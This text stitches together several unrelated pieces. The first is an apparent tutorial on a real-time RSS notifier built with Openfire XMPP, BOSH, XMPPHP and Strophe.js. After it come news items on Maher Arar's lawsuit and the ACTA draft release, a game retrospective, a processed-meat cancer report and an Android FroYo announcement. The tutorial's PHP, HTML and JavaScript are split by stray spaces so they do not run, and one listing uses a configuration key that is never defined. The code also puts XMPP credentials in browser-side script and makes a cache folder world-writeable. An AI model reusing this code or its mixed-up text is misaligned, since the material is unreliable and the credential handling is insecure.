Although the specification defines status as being human - readable , nothing stops you from storing any string there to suit your purposes .
For some applications , it might not be human - readable , or it might carry a data payload in the form of microformats .
You can set presence information independently for each resource owned by an XMPP entity , so only one user account is required to access and receive data for all the tools and contexts connected to a single user within an application .
Each resource can be assigned an independent priority level ; the XMPP server will try to deliver messages to resources with higher priorities first .
XMPP over HTTP using BOSH
Web applications that wish to communicate over XMPP using JavaScript must meet some special requirements .
For security reasons , JavaScript is not allowed to communicate with servers on different domains from the web page ’s domain .
If your web application interface is hosted at application .
mydomain.com , any XMPP communication must also take place at application.mydomain.com .
Firewalls are an additional complication .
Ideally , if you use XMPP as the basis of the real - time element of your web interface , you want it to work for users behind a firewall .
But corporate firewalls usually leave open only a few ports for a small number of protocols , to allow web data , email , and similar communications to get through .
By default , XMPP uses port 5222 , which a corporate firewall might well block .
Suppose you know that the firewall your users might sit behind will allow HTTP on port 80 ( the default protocol and port for accessing the web ) .
It is optimal if your XMPP communications can tunnel over HTTP on that port .
However , HTTP is n’t designed for continuous connections .
The architecture of the web is different from the communications architecture required for real - time data .
Enter the standard for Bidirectional - streams Over Synchronous HTTP ( BOSH ) .
It provides an emulation layer for bidirectional , synchronous data .
A long HTTP connection ( with a duration of a minute or two ) is established with an XMPP server .
If new data arrives during that time , the HTTP request returns data and closes ; otherwise , it simply expires .
Either way , once a request has closed , another one is reestablished .
Although the result is a series of repeated connections to a web server , it is an order of magnitude more efficient than Ajax polling , particularly because the connections are made to a specialized server rather than directly to the web application .
XMPP over BOSH allows the web application to continue to communicate with the XMPP server through a native connection .
The client connects through a standard URL over HTTP on port 80 .
This is then proxied by the web server to an HTTP URL on a different port — often 7070 — operated by the XMPP server .
As a result , the web application only needs to use resources whenever data is sent to the XMPP server , while the web client can operate from behind a firewall using commonly supported web standards .
The overhead of maintaining the long HTTP polls of BOSH is mostly handled by the XMPP server rather than the web server or the web application .
Neither the web server nor the XMPP server is subject to the same domain restrictions as JavaScript for their communications , and it is at this point that messages can be sent to other XMPP servers and clients .
Now that you understand how XMPP fits into the real - time web , you ’re ready to download and set it up so that you can begin to create the Pingstream application .
Obtaining and installing an XMPP server
In this section , you ’ll install the Openfire XMPP server and configure it to support your real - time web application .
Choosing an XMPP server
Two leading open source XMPP servers are available for free download .
Both are widely used and available under the GNU Public License version 2 , and each has its own strengths and weaknesses :
ejabberd :
The e in ejabberd refers to Erlang , the soft - real - time programming language .
This technical foundation makes ejabberd very fast .
It also has a high level of compliance with the XMPP core and related standards .
ejabberd can be installed in most environments .
Openfire : Openfire is written in the Java™ language , and is both user friendly and easy to install .
You ’ll use Openfire for this tutorial .
Creating the Openfire database
Create a new MySQL database for your Openfire users and configuration .
By using MySQL , you can programmatically add , edit , delete , and query your XMPP server users from your PHP web application , as well as scale your XMPP infrastructure in line with your web infrastructure .
If you have phpMyAdmin installed , for example as part of your XAMPP installation , you can follow these steps to create the database :
Select Privileges from the home screen .
Select
Add a new user .
Add user details ( ensuring the host is localhost ; for the duration of this tutorial , it will be assumed that you ’re testing on localhost ) , and select Create database with same name and grant all privileges , as in Figure 1 .
Do n’t give your new Openfire database user any global database privileges .
Figure 1 . Adding an Openfire database in phpMyAdmin
Once you add your user and database , you ’re ready to install the Openfire server .
Installing Openfire
Download the Openfire installer and run it to install Openfire into the location of your choice ( see Related topics ) .
( You can instead choose to check out a recent Openfire version from its Subversion source code repository and build it locally , but that ’s beyond the scope of this tutorial . )
When prompted , tell the Openfire installer to launch the server upon completion .
After the server launches , you should see the server status window in Figure 2 :
Figure 2 . Status window for Openfire
Click Launch Admin to open a web - based wizard , in Figure 3 , that takes you through the configuration of your Openfire server :
Figure 3 . Configuration wizard
The configuration wizard gives you the option to use either an embedded database or a standard database connection .
Choose a standard database connection so that you can use your MySQL database .
Select MySQL from the Database Driver Presets list .
Insert the name of your server and database into the Database URL field .
For example , for a MySQL database named openfire set up on localhost , you ’d enter :
jdbc:mysql://localhost:3306/openfire
Show more Show more icon
On the next screen of the wizard , opt to store user accounts in the database .
Enter the username and password for the database user you created earlier , and continue to the end of the configuration wizard .
By this point you should have created a server administrator and set up the domain location for your XMPP server .
Plug - in for per-user notifications
For the purposes of this demo , you ’ll simply use the two users you create here .
However , if you want to support sophisticated per-user notifications in your applications , you need to be able to add and remove users from the PHP portion of your application programmatically .
The User Service plug - in for Openfire gives you this capability through a REST interface for XMPP user administration .
To install the plug - in , download it from the Openfire plug-ins site ( see Related topics ) .
The plug - in itself is a single file : userservice .jar .
You must place it in the / plugins directory of your Openfire installation .
Log into the admin screen using the administrator credentials you established .
Click Edit Properties ( below Server ports ) , and make a note of the listed server name .
This will form the domain portion of your JIDs .
It is not interchangeable ; for example , you cannot use localhost in place of 127.0.0.1 , or vice versa .
Click on Users / Groups in the top navigation menu and create two new users .
These will be your test users during development .
Click on Server settings and then Offline messages .
Because you are using XMPP for interface notifications , set the Offline Message Policy to Drop , as in Figure 4 .
You do n’t want to keep messages that are sent when users are n’t logged in ; otherwise they might be inundated with thousands of notifications when they return .
Figure 4 . Dropping offline messages
In Server settings , click on Server to Server .
For your purposes , you need n’t be concerned with external servers , because you will not operate as a connected part of the wider XMPP network .
Therefore , set Service Enabled to Disabled , and Allowed to Connect to White List .
These settings will prevent unauthorized connections from causing havoc .
Configuring Apache to forward XMPP over BOSH
Openfire maintains an HTTP binding URL for access over BOSH at http://localhost:7070/http-bind .
To use this on port 80 , you must configure the Apache HTTP Server to forward a URL to this location .
For this , you need to enable the proxy module .
Open your http.conf
Apache configuration file and find the LoadModule entries for mod_proxy .
so and mod_proxy_http.so , which are commented out by default .
Uncomment them by removing the leading number sign ( # ) character .
The appropriate lines in the Dynamic Shared Object ( DSO ) Support section of the configuration file ( which are n’t necessary adjacent to each other ) should now resemble those Listing 8 :
Listing 8 . Enabling proxy support in Apache HTTP Server
LoadModule proxy_http_module modules/mod_proxy_http.so LoadModule proxy_module modules/mod_proxy.so
Show more
Show more icon
At the bottom of the configuration file , add the lines in Listing 9 ( substituting your server IP address for 127.0.0.1 if you ’re not using localhost as your test server environment ) :
Listing 9 . XMPP proxy rule in httpd.conf
# XMPP proxy rule ProxyRequests Off ProxyPass / xmpp-httpbind http://127.0.0.1:7070/http-bind/
ProxyPassReverse /xmpp-httpbind http://127.0.0.1:7070/http-bind/
Show more
Show more icon
Notice in Listing 9 that you use a slightly different URL , / xmpp- httpbind , on port 80 .
This URL is the value that strophe.js , the client - side JavaScript framework you ’ll use later , assigns to a variable that sets the BOSH endpoint .
Restart the server .
You ’re finally ready to begin programming web applications using XMPP .
Creating the server application using XMPPHP
In the previous sections , you set up the server and the plug-ins .
In this section you will create the server - side portion of your real - time application .
Server - side functionality
The PHP side of your application will perform two main tasks :
A PHP script will fetch an RSS feed and notify you if the first entry has changed since the last time you checked .
A front - end script will initialize your JavaScript XMPP client .
Start by creating a new PHP project space called pingstream within the web root of your testing server .
If you use the PHP Development Tools project extensions for the Eclipse development environment , take care to create the project within the web root rather than the default workspace for Eclipse ( see Figure 5 ) :
Figure 5 . Creating a new Eclipse PHP project
Figure 5 shows the following values for the Pingstream project :
Project name field : Pingstream
Contents radio button : Create project from existing source
Directory field : c:\xampp\htdocs\pingsstream
PHP Version radio button :
Use default PHP settings
XMPPHP is the most widely used XMPP library for PHP .
Like ejabberd and Openfire , it ’s free and open source , so it serves as a good starting point for first - time XMPP developers .
Download XMPPHP ( see Related topics ) .
Unpack the archive and insert it into the lib / xmpphp subfolder of your new project .
Finally , to save time parsing your RSS feed , download and install the Last RSS PHP parser ( see Related topics ) .
Storing server - side settings
You ’ll use one of the test users you created earlier as your sending party for notifications .
Create a file called config.inc.php in the root of your / pingstream folder and add the contents of Listing 10 :
Listing 10 .
Server - side configuration settings
<? php // Pingstream configuration file // Define global $ CONFIG array - do n't change this !
global $ CONFIG ; $ CONFIG = array ( ) ; $ CONFIG [ ' send ' ] = new stdClass ( ) ; //
Set account details for sending party $ CONFIG [ ' send ' ] -> user = ' testuser ' ; //
User portion of JID $ CONFIG [ ' send ' ]-> host = ' 127.0.0.1 ' ; //
Host portion of JID $ CONFIG [ ' send ' ]->resc = ' pingstream ' ;//
Resource portion of JID $ CONFIG [ ' send ' ] -> pass = ' mypass ' ; // Password for user Show more
Show more icon
The config.inc.php file also must include details about your receiving party , as in Listing 11 :
Listing 11 .
Details about receiving party
//
Set the receiving account details $ CONFIG [ ' receive ' ] = 'receivinguser@127.0.0.1 ' ;
Show more
Show more icon
You will cache a small amount of data in a file , so config.inc.php needs to include a writeable file path , as in Listing 12 :
Listing 12 .
Setting the location to store temporary files
// Full path to your cache directory , with trailing slash $ CONFIG [ ' cachedir ' ] = '/tmp/';
Show more
Show more icon
If you ’re on a Microsoft ® Windows ® machine , you can set this to be a blank string .
Otherwise , make sure the directory that you specify has a full path and a trailing slash , and is set to world - writeable .
Defining the data source
Your Pingstream application will check the IBM Developer Web development zone feed for updates , so add the contents of Listing 13 to config.inc.php :
//
Set the RSS feed you 're going to check $ CONFIG [ 'rss ' ] = ' http://www.ibm.com/developerworks/views/web/rss/libraryview.jsp';
Show more
Show more icon
Now , create another new file , / lib.inc.php .
This will be your library file , included in the main controller page and user interface page of your application .
The top of lib.inc.php must reference config.inc.php , the main XMPPHP library , and lastRSS , as in Listing 14 :
Listing 14 .
Loading required libraries
<? php // Load libraries require_once ( ' XMPPHP/XMPP.php ' ) ; require_once ('config.inc.php ' ) ; require_once (' lastRSS.php ' ) ;
Show more
Show more icon
Next , you ’ll create a function to send a message to the client through XMPP .
Doing this through XMPPHP is easy .
You establish a connection using the credentials you saved in your configuration file , send the message , and close the connection .
In the first part of the function you create a new XMPPHP_XMPP object , as in Listing 15 :
Listing 15 .
Creating a new XMPP connection object
// Load configuration global $ CONFIG ; $ conn = new XMPPHP_XMPP ( $ CONFIG [ ' connect ' ] -> host , 5222 , $ CONFIG [ ' connect ' ] ->user , $ CONFIG [ ' connect ' ] -> pass , $ CONFIG [ ' connect ' ] ->resc ) ;

Note that XMPPHP connects to your XMPP server over port 5222 , the default port for XMPP communications .
Although you need to use BOSH for your client - side communications , there is no requirement for you to do so on the server side .
To connect , you send an initial connection request , wait until you receive notification that your XMPP session has started , and send a presence stanza to announce that you are online ( see Listing 16 ) :
Listing 16 .
Establishing an XMPP connection
$ conn -> connect ( ) ; $ conn->processUntil ( ' session_start ' ) ; $ conn -> presence ( ) ;

Next you send the message itself , which you have prefilled in a variable called $ message ( see Listing 17 ) :
Listing 17 .
Sending the message
$ conn -> message ( $ CONFIG [ ' receive ' ] , $ message ) ; Show more Show more icon
Then you disconnect using $ conn-> disconnect ( ) ; .
During this process you might encounter errors .
Listing 18 puts the code in Listings Listing 15 , Listing 16 , and Listing 17 into a function to insert into lib.inc.
php .
In the process it wraps the business of sending a message in a try / catch statement that writes any exception messages to the error log .
Listing 18 .
The complete send_notification function , including try / catch statement for logging errors
/** * Updates everyone 's user interface with a message */ function send_notification ( $ message ) { //
Load configuration global $ CONFIG ; $ conn = new XMPPHP_XMPP ( $ CONFIG [ ' connect ' ] -> host , 5222 , $ CONFIG [ ' connect ' ] ->user , $ CONFIG [ ' connect ' ] -> pass , $ CONFIG [ ' connect ' ] -> resc ) ; try { $ conn -> connect ( ) ; $ conn->processUntil( ' session_start ' ) ; $ conn -> presence ( ) ; $ conn -> message ( $ CONFIG [ ' receive ' ] , $ message ) ; $ conn->disconnect ( ) ; } catch ( XMPPHP_Exception $ e ) { error_log ( $e -> getMessage ( ) ) ; } } Show more

You can use this simple mechanism for any number of public - notification applications .
Here , you give all users who visit the site the same notifications , but it is a trivial matter to tailor notifications by the following mechanism :
Each user is given a unique session string , or a shared string specific to a particular interest or search .
This string is added to the JID of the receiving party as the resource segment Messages are then sent to the user@domain / session - string JID
Obtaining external data
Next , you need a function , in Listing 19 , to retrieve the last RSS item from your designated feed :
Listing 19 .
Getting the most recent item in an RSS feed
function get_last_feed_item ( ) { global $ CONFIG ; // Load configuration $rss = new lastRSS ; // Initialize lastRSS $rss->CDATA = ' content ' ; if ( $rs = $rss -> get ( $ CONFIG [ 'rss ' ] ) ) { if ( isset ( $rs [ ' items ' ] [ 0 ] ) ) return $ rs [ ' items ' ] [ 0 ] ; else return false ; } } Show more Show more icon
This function initializes lastRSS , loads the RSS feed that you configured ( in your case , the latest article feed for the IBM Developer Web development zone ) , and returns the topmost entry as an array .
Once you have the latest feed item , you need to know if it changed since last time you checked .
You ’ll use a small text file for this purpose .
For secure applications , it is better to use the database or another method , but for your testing purposes , it ’s safe to use a small file cache .
The cache stores the URL of the latest feed item each time you check ; if the URL changed , you have a new item and should notify the user .
Another function , feed_has_changed , returns true or false , accordingly .
Either way , it also saves the new latest URL in the cache file , ready for the next time it checks .
Listing 20 shows the feed_has_changed function :
Listing 20 .
Returning any new feed data
function feed_has_changed ( $url ) { global $ CONFIG ; $ changed = false ; // Check to see if the file exists , and if it does , if // the URL has changed if (!file_exists ( $ CONFIG [ ' cachedir ' ] . ' cache.txt ' ) ) { $ changed = true ; } else if ( file_get_contents ( $ CONFIG [ ' cachedir ' ] . ' cache.txt ' ) != $ url ) { $ changed = true ; } //
If the URL has indeed changed , update the version in the cache // and return true if ( $ changed ) { file_put_contents ( $ CONFIG [' cachedir ' ] . ' cache.txt ' , $url ) ; return true ; } //
Otherwise return false return false ; } Show more Show more icon
You ’ll pass a simple HTML - encoded version of the latest item to the client .
In a more advanced application , you could encode the item in JavaScript Object Notation ( JSON ) or XML , including a little more metadata , and allow the client - side JavaScript to format it appropriately depending on the device and browser .
For now , however , the version in Listing 21 will do :
Listing 21 .
Encapsulating a feed item in simple HTML
function last_item_html( $item ) { return <<< END < div class = " item " > < div class =" item_title " > < h2 > < a href= " {$ item [ ' link ' ] } " target = " _blank " >{ $ item [ ' title ' ]
}
</a></h2 > </div > < div class= " item_body " > { $item [ ' description ' ] } </div > </div > END ; } Show more
Show more icon
Finally , create a new PHP file in your / pingstream directory called backend .
php .
Use the simple PHP script in Listing 22 as the file ’s contents .
The script retrieves the RSS feed and sends a JSON - encoded version of the most recent feed item through XMPP to your receiving party .
Listing 22 .
Sending the encapsulated feed item over XMPP
<?php require_once ('lib.inc.php ' ) ; if ( $ lastitem = get_last_feed_item ( ) ) { if ( feed_has_changed ( $ lastitem [ ' link ' ] ) ) { send_notification ( last_item_html( $lastitem ) ) ; } } Show more Show more icon
This is all you need to send dynamic notifications to public users of the application .
Ideally , you should run the backend .
php script on a regular cron job .
However , for testing purposes you can execute the script manually through a web browser .
The browser application : Strophe.js and jQuery
In this section , you will write JavaScript functions in order to receive messages through XMPP over BOSH , and build an HTML user interface to display received notifications .
Creating the user interface
You now need to create the user interface to receive the notifications .
Strophe.js is a commonly used JavaScript library for sending and receiving XMPP data over BOSH .
For your purposes in Pingstream , you will simply be receiving data , although it ’s easy to see that two - way communication allows you to build rich collaborative environments quickly .
Although it comes in several flavors , the JavaScript version of Strophe is most useful to you as a browser - based XMPP client .
Download the compressed package ( see Related topics ) , and extract it into a strophejs folder in the pingstream directory .
The jQuery JavaScript framework makes both event handling and DOM manipulation considerably simpler .
The supplied Strophe.js examples use it extensively , and the two are a natural fit together .
Download jQuery ( see Related topics for a link ) and place the minified version in a jquery directory in pingstream .
Create a new index.html file .
Include references to the Strophe and jQuery libraries you just downloaded , as well as a pingstream .js library that you ’ll define in a moment .
In the body element , add a div element with ID notifications , as in Listing 23 :
Listing 23 .
Client HTML page
<! DOCTYPE html > < html > < head > < title > Latest content </ title > < script type =" text/ javascript " src=" jquery / jquery - 1.4.2.min.js " ></ script > < script type =" text/ javascript " src=" strophejs/strophe.js " ></ script > < script type =" text / javascript " src=" pingstream.js " ></ script > </ head > < body > < h1 > Latest content :</h1 > < div id=" notifications " ></div > </ body > </html >
Show more
Show more icon
Create the JavaScript file — pingstream.js — you just referenced in Listing 23 .
At the top of pingstream.js , define the BOSH proxy endpoint that you configured in Apache earlier , as in Listing 24 :
Listing 24 .
Setting the BOSH endpoint
var BOSH_SERVICE = '/ xmpp-httpbind ' ; var connection = null ;
Show more Show more icon
When the page fully loads , you want to connect automatically to the XMPP server .
You can do this using jQuery ’s $ ( document ) .
ready call ; inside , you create a new strophe .js Strophe .
Connection object and use it to connect to the server , as in Listing 25 :
Listing 25 .
Establishing a connection over BOSH
$ ( document ) . ready ( function ( ) { connection = new Strophe.Connection ( BOSH_SERVICE ) ; connection.connect ( " sendinguser@127.0.0.1 " , " sendingpass " , onConnect ) ; } ) ; Show more Show more icon
More - robust options
For the purposes of this tutorial ’ , you are using the sending party you defined earlier .
For a more robust application , it might be better to create a new user for each registered application user and subscribe each one to a publish - subscribe interface .
Alternatively , Strophe.js can log in anonymously if you leave the username and password blank and the XMPP server is configured to accept this type of connection .
In these cases , a JID is created dynamically for each anonymous user ; these must be managed .
Finally , an extension for an XMPP chat room is also available .
In Listing 25 , the Strophe .
Connection .connect method contains a reference to an onConnect function as one of its parameters .
onConnect is launched once a connection is established .
This is your opportunity to add a notification handler for incoming messages ; here you register a function called notify User .
Following this , you send a simple presence stanza .
To confirm that you can connect and receive new messages , also send a friendly notification to the user .
Add the code in Listing 26 above the $ ( document ) ready call in your JavaScript file :
Listing 26 .
Handling incoming XMPP messages
function onConnect ( status ) { $ ( ' # notifications ' ) . html ( '< p class = " welcome " >
Hello !
Any new posts will appear below .
</p >' ) ; connection.addHandler( notifyUser , null , ' message ' , null , null , null ) ; connection.send ( $pres ( ) .tree ( ) ) ; } Show more
Show more icon
Finally , because you registered the notification handler , Strophe.js calls the notify User ( msg ) function whenever the XMPP client receives message stanza .
The msg parameter is a representation of the XML stanza itself , which can be queried as in Listing 27 :
Listing 27 .
Querying the msg parameter
var elems = msg.getElementsByTagName(' body ' ) ; var body = elems [ 0 ] ; $ ( '#notifications ') .append( Strophe.getText( body ) ) ;
Show more
Show more icon
Ideally , you want to limit messages so they only display if they were sent from your server - side sending user .
You can wrap it all in an if statement that forms the body of the notify User function , in Listing 28 .
notify User function :
Listing 28 . notifyUser function
function notifyUser(msg ) { if ( msg.getAttribute (' from ' ) == " testuser@127.0.0.1 /pingstream " ) { var elems = msg.getElementsByTagName(' body ' ) ; var body = elems [ 0 ] ; $ ( '#notifications ') .append( Strophe.getText( body ) ) ; } return true ; } Show more Show more icon
This needs to sit above the onConnect function defined in Listing 26 .
Putting it all together
Open your index.html file in a web browser .
You should see a simple heading and a message saying that updates will appear below ( which you might recall was your test notification to yourself that the XMPP connection was working successfully ) .
Now load backend .
php .
As if by magic , the latest update from the IBM Developer Web development zone is showing up on your page .
Other example sources with RSS feeds include Twitter accounts , news agencies , and update feeds from automatic server - monitoring software .
This is a simple start to developing with a powerful platform .
Strophe.js can facilitate two - way communication with the application , although it might be simpler to use standard jQuery HTTP callbacks to get user input into the system , to obviate the necessity for programming an XMPP monitoring daemon for your application .
More excitingly , when you use the web server as a BOSH proxy , two or more web clients can speak to one another over XMPP without much input from the server - side web application at all .
The implications for everything from office collaboration software to games are huge .
Conclusion
This tutorial discussed the need for real - time web applications and how XMPP overcomes the shortcomings of existing technologies .
To demonstrate the effectiveness of this approach , you developed a simple RSS update notification application using XMPPHP , Last RSS , Strophe.js , Openfire , and PHP .
Although it requires an added server layer and some new JavaScript techniques , XMPP is a much better fit for real - time web applications than the traditional Ajax polling model .
It ’s faster , requires much less overhead in terms of both development and system infrastructure , and uses a powerful emerging standard for web development .

The U.S. Supreme Court declined Monday to review the dismissal of a lawsuit brought against the government by a Canadian citizen who , under suspicion of being connected to Al Qaeda , was sent by U.S. authorities to be tortured in Syria .
The rejection likely marks the end of Maher Arar 's chances of getting redress from the federal government for an egregious decision made by the Bush administration .
The U.S. stonewalling of Arar 's search for justice has continued under the Obama administration , which argues that the doctrine of " State Secrets " precludes allowing any judge to review the materials that led John Ashcroft 's Justice Department to send Arar to Syria .
Arar was detained in the United States on a stopover at JFK on his way back to Canada from a family vacation in Tunis .
After being held for 12 days , he was sent to Syria , the country of his birth , where he was imprisoned for almost a year .
The Bush administration ignored his protests that he would be tortured there .
Arar was held in Syria for 10 and a half months in a cell measuring 3 feet by 6 feet by 7 feet , and was tortured with steel cables .
Upon his release , Arar sued Bush 's Justice Department , but his lawsuit was rejected by a succession of U.S. courts , in part out of deference to the executive branch 's claim that national security would be harmed by allowing a federal judge to review the relevant evidence .
That 's a common legal maneuver that was used frequently by the Bush administration , and which Obama pledged to use less often .
So far , those promises have been proven to be empty .
In contrast , Arar 's home country of Canada – which provided the United States with the bad intel that prompted the whole affair – investigated the case ( .pdf ) , confirmed that Arar was tortured in Syria , took responsibility , apologized and paid Arar U.S. $ 10.2 million as recompense for his year of detention and torture at the hands of Syrian intelligence .
Arar and his family remain on a U.S. watch list , and the United States has never officially apologized or admitted it made a mistake .
Instead , Obama 's Justice Department told the Supreme Court that Arar 's case remained too secret for justice , and that the U.S. law offers no recourse for him .

Lessons Learned : Record of Agarest War
by Michael Camacho [ Monday , 17th of May 2010 - 02:34 PM
]
As a gamer that is very keen on the import scene , I had heard of Record of Agarest War when it was first released in Japan in late 2007 .
I was intrigued by the reported dating aspects , the Soul Breeding the game touted and being able to play through story through multiple generations .
Not surprisingly , I never thought this very Japanese - style game would see a release in the U.S.
Last year I purchased the European release for the PS3 and before being able to play the game for any serious amount of time , I sold it at the announcement of the U.S. release .
This release would even be available on the XBox 360 and come with bonus items , such as a pillow case , soundtrack and a mouse pad featuring one of the characters with her breasts being there for wrist support .
Hell , I even purchased the Agarest War canvas at auction from Aksys Games at PAX East .
Fast forward to release day , April 27 , 2010 .
The game arrives promptly at my doorstep the very next day .
With much anticipation I opened the Naughty Edition XBox 360 version .
Placing the mouse pad at my PC , I left the pillow case and soundtrack in the box in order to immediately put the game in my XBox 360 .
As I always do , I ripped the game to my hard drive to quiet the machine and cut down loading times .
I started up the game and quickly began the story .
Record of Agarest
War is about a young general named Leonhardt who turns against his own nation to save a young girl named Elaine .
You quickly realize a dark force is helping your nation attempt to conquer the nations surrounding them .
You begin your quest to try and stop these attempts at domination and at the same time , put an end to the evil forces at hand .
Now , I am not a Strategy RPG fan by any means , but I quickly felt comfortable with the battle system in Agarest War .
It has some very staple Strategy RPG designs with Attack Points , a grid battlefield and movement handling .
What helps it stand out is an interesting " Link " system that helps connect your characters depending on their placement on screen .
This allows you to do multiple attacks with different characters in one turn , including combo attacks if they are available .
How quickly you defeat your enemy also determines the stat and EXP bonuses you receive at the end of the battle .
The graphics are not exactly what one may expect from current generation systems - it features 2D sprites while in battle and still drawings while in conversation .
The drawings of the characters are well - detailed and look very crisp in HD , but sadly have no animation to them .
Thankfully , this does not detract from the overall experience of the game .
The game features the original Japanese voices with English subtitles , which was an excellent decision in my opinion .
The voices of the characters fit each person 's personality perfectly .
The game 's soundtrack is typical of many Japanese RPGs , yet very well composed .
The soundtrack can stand alone apart from the game and if you are buying the initial release , you are treated to a Soundtrack CD .
Unfortunately , I can not speak on too much more about this game , as I was only about 15 hours into generation one and managed to royally screw my game progress .
During some events , you can't leave , and if you save during them , you are now stuck in that event until you finish it .
You also can't heal between battles , so if someone dies , they can be lost for the rest of that event if not resurrected in time .
Well , as I was playing through the game on easy , I was pretty much blowing through every fight and Boss Battle up until this point , I figured there would be no trouble in saving right before the current fight I was taking a part in .
Alas I was wrong .
I found myself under - leveled and getting my ass handed to me on a platter .
I attempted the battle a couple more times before rage quitting for the night .
Two days later I tried again , now pushing my attempts into the double digits with no success .
I would sometimes get close , but could never finish the battle out .
Again , another night and more attempts with no luck .
Like I said , I 'm not a huge fan of Strategy RPGs , so I am not used to how grinding and leveling work .
I also was n't expecting a boss fight to become a lot tougher than the normal battles I had been taking part in .
I expect an increase in difficulty for a boss battle , but not what I experienced .
After much frustration and a few more hours after my initial mistake in saving the game , I can no longer proceed .
My will is broken and my desire to play through this game has been lost .
Maybe one day I will be able to come back to the game and finish it , but as of now there is no way for me to continue .
I hope people take heed in this article and do n't see this as me knocking the game .
This comes from my own inexperience in Turn Based Strategy titles and my own mistake of not creating a separate save file as a back up in case something goes wrong .
I lost nearly 20 hours thanks to that mistake and completely shattered my own experience .
I do think fans of the genre will love the game and have a blast with the story and characters it presents .
Alas I will not be one of them currently enjoying the game .
I hope one day I will find the time to come back and play through Record of Agarest War again .
Michael purchased this game himself for the XBox 360 and received no considerations from Aksys Games .
Representatives from 27 countries have agreed to release the latest draft text of the Anti-Counterfeiting Trade Agreement ( ACTA ) , a global effort to harmonise intellectual property laws that has been governed by secrecy to date .
The ACTA treaty , which is expected to have significant implications for both internet service providers and those internet users that choose to share copyrighted content , is being led by the United States and includes representatives from Australia , New Zealand , Japan , Europe and Canada .
Civil rights activists and the internet community at large have been calling on the talks to be more transparent and participatory .
Stakeholders from Australia and New Zealand established an online petition calling on the 27 Governments party to the talks to open up the process last week as negotiators met for a new round of negotiations in Wellington , New Zealand .
Negotiators have responded by promising to release a draft of the agreement by Wednesday April 21 .
" Negotiations have now advanced to a point where making a draft text available to the public will help the process of reaching a final agreement , " the statement said .
" Participants have reached unanimous agreement that the time is right for making available to the public the consolidated text coming out of these discussions , which will reflect the substantial progress made at this round . "
Prior drafts of the ACTA text have been leaked by insiders , complete with comments as to the negotiating positions of member countries .
But these negotiating positions will be omitted from the official released draft .
" In agreeing to release publicly this draft text in the particular circumstances of this negotiation , participants reaffirmed the importance of maintaining the confidentiality of their respective positions in trade negotiations , " the negotiators ' statement said .
The statement also reiterated promises by Australian negotiators that ACTA would not mandate a " three strikes " or " graduated response " policy , under which ISPs would be forced to cut off internet subscribers accused of filesharing .
" While the participants recognise the importance of responding effectively to the challenge of Internet piracy , they confirmed that no participant is proposing to require governments to mandate a ' graduated response ' or ' three strikes ' approach to copyright infringement on the Internet , " the statement said .
Read on to Page Two for local reactions ...
Transparency welcomed
At home , academics and observers welcomed the new policy .
" We welcome the decision to release an official version of the draft text as a significant stride towards greater transparency , " said Matt Dawes , copyright advisor at the Australian Digital Alliance ( ADA ) .
" It is an acknowledgement of the mounting pressure on governments to open up the negotiations as a result of leaked documents and rising public and political concern .
It represents an opportunity to move away from the hysteria ... and to focus on meaningful public discussion of the real issues . "
Internet Industry Association chief Peter Coroneos said it was a " positive if overdue development " .
" It will now afford us an opportunity to consider the implications of what previously was only available via unofficial channels , " he said .
Kimberlee Weatherall , senior lecturer in law at the University of Queensland said the decision was long overdue .
" I 'm very pleased to see that the parties have finally opted in favour of greater transparency .
I think this will facilitate discussion and better enable interested parties to make sensible and focused submissions , " she told iTnews .
" It 's the right result , and I 'm glad it 's been reached , although it 's a shame it 's taken this long . "
Weatherall said some credit was due to some staunch Government officials within the EU as well as Australia 's own Greens party which had asked questions about ACTA transparency in Parliament .
Weatherall noted that since the text of prior drafts had already been leaked , all that will be gained from the official release will be " showing how much progress has been made . "
But she and Dawes are nonetheless anticipating many hours studying the released draft to consider the implications for Australians .
" The most important development to flow from this decision is that for the first time , governments will be able to provide detailed comment on public concerns , " Dawes said .
" Previously , governments have been unwilling to comment on the veracity of leaks or the specific issues arising from them .
Dawes said the ADA looks forward to discussions with Australian negotiators - led by the Department of Foreign Affairs and Trade ( DFAT ) , after studying the release .
" Analysis of leaked documents has revealed that ACTA may conflict with Australia 's copyright law - which protects consumers , enables access to information and is fundamental to the success of the digital economy , " he said .
Dawes remains unconvinced that ACTA is not aimed at introducing a three strikes policy .
" The statement that the three strikes procedure will not be mandatory under ACTA must be taken with a grain of salt , " he said .
" The real threat from ACTA is its encouragement of three strikes .
Analysis of leaks reveals that ACTA will require ISPs to deter online infringement , and that this may be done by cutting off someone 's internet access .
The clear implication is that anything less than three strikes , which dealt only with termination of repeat infringers but did not seek in any further way to reduce infringement would be insufficient .
" The next question is , to what extent will voices representing the public interest perspective have a chance to be heard and to influence the outcome of the negotiations ?
So far it has been a one way street for rights holders . "
Negotiators expect to meet in Switzerland in June 2010 and complete the ACTA text by the end of the year .

Men eat much more processed meat than women and are less likely to know that processed meat consumption has been linked to bowel ( colorectal ) cancer , according to a poll conducted for the World Cancer Research Fund ( WCRF ) .
" The evidence that eating processed meat increases bowel cancer risk is convincing and this is why we recommend people avoid eating it , " said the WCRF 's Rachel Thompson .
" But despite the strength of the evidence , awareness levels are low and this seems to especially be the case in men .
This is a concern because , as men eat roughly double the amount of processed meat as women do , they could make a bigger difference to their cancer risk by cutting down .
"
The researchers found that men in the United Kingdom eat approximately 50 grams ( 1.8 ounces ) of processed meats such as bacon , ham , salami and sausage per day .
In contrast , British women eat only 24 grams of processed meat per day .
Research suggests that eating 50 grams of processed meat per day -- roughly equivalent to two slices of bacon -- increases a person 's risk of bowel cancer by 20 percent .
Yet the WCRF poll of 2,000 adults found that only 41 percent of women and 36 percent of men were aware of this risk .
Only 63 percent of respondents knew that a poor diet can increase the risk of cancer , and only 60 percent knew that being overweight also increases cancer risk .
Researchers believe that one in ten cases of bowel cancer could be averted if everyone kept their consumption to less than 70 grams per week .
" It is important to emphasize that while we recommend avoiding processed meat , this is not a question of all or nothing , " Thompson said .
" If you do not want to give up processed meat altogether , you can still make a real difference to your cancer risk by cutting down from , for example , having a bacon sandwich every day to only having one a couple of times a week .

At Google I/ O this morning , the topic of discussion was mobile ; specifically , the Android mobile platform .
As of this morning , there are more than 60 consumer devices running on Android , more than 100,000 new activations per day , 50,000 apps in the Android marketplace , and 180,000 registered developers working on apps .
Not too shabby .
As the platform continues its rapid growth , Google has announced a number of very significant improvements will be coming to the next version , numbered 2.2 but nicknamed " FroYo , " which address key issues Android has dealt with in the past .
1 ) Improved Speed -- Just as it was rumored , the next version of Android will have a JIT compiler , responsible for a significant ( 2 x - 5 x ) speed boost .
Advertisement
2 ) Better Enterprise Support --
The platform has lagged behind Windows Mobile and BlackBerry in terms of enterprise functionality , but FroYo will include over 20 new enterprise features .
